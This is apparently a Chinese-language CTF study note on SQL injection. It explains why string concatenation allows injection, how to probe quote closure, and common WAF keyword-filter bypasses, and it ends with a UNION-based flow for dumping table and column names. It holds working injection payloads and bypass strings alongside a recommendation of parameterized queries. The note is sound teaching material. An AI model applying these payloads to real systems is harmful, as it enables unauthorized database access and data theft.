---
title: CTF Web 笔记：SQL 注入的原理与几种绕过初探
description: 从 ' OR '1'='1 讲起：注入为什么成立、怎么判断闭合、以及过滤关键词时的常见绕法。
date: 2026-10-02
tags: [CTF, Web]
---

## 注入的本质：数据和代码的边界消失了

SQL 注入之所以存在，是因为后端把**用户的输入**直接拼进了 **SQL 语句**。一条再普通不过的查询：

```sql
SELECT * FROM users WHERE username = '$input' AND password = '$input2';
```

当我在用户名里填 `' OR '1'='1`，拼接结果变成：

```sql
SELECT * FROM users WHERE username = '' OR '1'='1' AND password = '...';
```

引号把我「抬」出了字符串的位置，我写的不再是数据，而是逻辑本身。

> 防御方视角一句话：永远用参数化查询（Prepared Statement），拼接是原罪。

## 做题第一步：摸闭合方式

拿到注入点，先确定引号/括号怎么闭合。常见的探测输入：

```
'   "   ')   "))   \'
```

判断依据是三种现象：

| 现象 | 含义 |
| --- | --- |
| 页面正常 | 语法闭合成功 |
| 数据库报错 | 语法错了，但报错泄露了闭合结构 |
| 页面空白/异常 | 语法错了或结果集为空 |

布尔盲注的基准测试：`' AND 1=1 -- -` 与 `' AND 1=2 -- -` 页面对比。

## 过滤了 union 怎么办

比赛里更常见的是 WAF 过滤。常见绕法按「偷懒程度」排序：

1. **大小写混写**：`UnIoN`（针对先统一小写再黑名单的实现）；
2. **URL 编码 / 双重编码**：`%75n%69on`；
3. **注释分段**：`un/**/ion`（MySQL），用注释符吃掉过滤器里的关键字；
4. **内联注释**：`/*!50000union*/`（MySQL 版本条件注释，5.0+ 会执行）；
5. **换行/制表符代替空格**：`%0a` `%09`；
6. **等价替换**：被禁 `SUBSTR` 就上 `MID`、`LEFT`；被禁 `IF` 就上 `CASE WHEN`。

## 一个最小可跑的联合注入流程

以 Less-1 风格题目为例：

```sql
' ORDER BY 3 -- -        （正常）
' ORDER BY 4 -- -        （报错） → 3 列

' UNION SELECT 1,2,3 -- -                       -- 找回显位

' UNION SELECT 1,table_name,3 FROM information_schema.tables
    WHERE table_schema=database() -- -          -- 摸表

' UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns
    WHERE table_name='flags' -- -               -- 拖数据
```

## 复盘

这节笔记真正的收获是那句『数据和代码的边界消失了』。
以后读到 SSTI、命令注入、XSS，都可以用这把尺子量一量：**是哪层边界没了，才让输入拿到了执行权**。
